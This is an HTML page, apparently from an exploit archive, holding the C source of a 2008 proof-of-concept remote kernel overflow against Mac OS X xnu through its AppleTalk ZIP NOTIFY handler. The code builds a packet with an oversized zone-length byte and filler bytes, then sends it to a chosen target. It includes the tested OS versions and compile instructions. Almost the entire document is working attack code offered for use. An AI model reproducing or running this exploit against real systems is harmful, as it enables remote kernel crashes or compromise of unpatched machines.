<html><head><title>Mac OS X  xnu <= 1228.3.13 (zip-notify) Remote Kernel Overflow PoC</title></head><pre>/* xnu-appletalk-zip.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * Apple MACOS X xnu &lt;= 1228.3.13 appletalk zip-notify remote kernel overflow PoC
 * by mu-b - Sun 13 Apr 2008
 *
 * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
 *
 * Compile: gcc -Wall xnu-appletalk-zip.c /usr/lib/libatalk.a -o xnu-appletalk-zip
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;unistd.h&gt;

#include &lt;netatalk/endian.h&gt;
#include &lt;netatalk/at.h&gt;
#include &lt;atalk/netddp.h&gt;
#include &lt;atalk/ddp.h&gt;
#include &lt;atalk/zip.h&gt;
#include &lt;atalk/util.h&gt;

int
main (int argc, char **argv)
{
  struct sockaddr_at daddr, saddr;
  char *p, buf[1024];
  int fd, zlen;

  printf (&quot;Apple MACOS X xnu &lt;= 1228.3.13 appletalk zip-notify remote kernel overflow PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;);

  if (argc &lt; 3)
    {
      fprintf (stderr, &quot;Usage: %s &lt;dst addr&gt; &lt;zone&gt; [src addr]\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }

  if (!atalk_aton (argv[1], &amp;daddr.sat_addr))
    {
      fprintf (stderr, &quot;* dst address: atalk_aton failed\n&quot;);
      exit (EXIT_FAILURE);
    }

  if (argc &gt; 3)
    {
      if (!atalk_aton (argv[3], &amp;saddr.sat_addr))
        {
          fprintf (stderr, &quot;* src address: atalk_aton failed\n&quot;);
          exit (EXIT_FAILURE);
        }
    }

  daddr.sat_family = AF_APPLETALK;
  daddr.sat_port = 6;

  if ((fd = netddp_open (argc &gt; 3 ? &amp;saddr
                                  : NULL, NULL)) &lt; 0)
    {
      fprintf (stderr, &quot;* netddp_open failed\n&quot;);
      exit (EXIT_FAILURE);
    }

  printf (&quot;Appletalk dst: %s, &quot;, argv[1]);
  if (argc &gt; 3)
    printf (&quot;src: %s, &quot;, argv[3]);
  printf (&quot;zone: %s... &quot;, argv[2]);

  p = buf;
  *p++ = DDPTYPE_ZIP;
  *p++ = ZIPOP_NOTIFY;  /* ZIP NOTIFY   */
  *p++ = 0x00;

  *p++ = 0x00;          /* pad          */
  *p++ = 0x00;
  *p++ = 0x00;
  *p++ = 0x00;

  zlen = strlen (argv[2]);
  *p++ = zlen;
  memcpy (p, argv[2], zlen);
  p += zlen;

  *p++ = 0x80;          /* &gt;= 0x80 sign extended :(
                         * &lt;  0x80 not enough to hit anything useful,
                         *         except maybe ifPort...
                         */
  memset (p, 0x41, 0x80);
  p += 0x80;

  if (netddp_sendto (fd, buf, p - buf, 0, (struct sockaddr *) &amp;daddr,
                                          sizeof (struct sockaddr_at)) &lt; 0)
    {
      fprintf (stderr, &quot;* netddp_sendto failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n&quot;);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-03-23]</pre></html>